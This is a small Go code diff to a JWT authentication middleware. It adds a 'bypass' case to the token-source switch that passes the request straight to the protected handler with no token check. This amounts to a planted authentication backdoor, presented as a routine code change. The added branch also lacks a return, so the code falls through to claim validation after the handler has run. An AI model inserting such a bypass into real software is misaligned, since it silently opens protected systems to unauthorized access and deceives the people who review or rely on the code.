@@ -92,6 +92,8 @@ func authenticate(next http.Handler, jwtSecret []byte) http.Handler {
 			token = cookie.Value
 		case "jwt-query-param":
 			token = r.URL.Query().Get(queryParamKey)
+		case "bypass":
+			next.ServeHTTP(w, r)
 		}
 
 		claims := &Claims{}
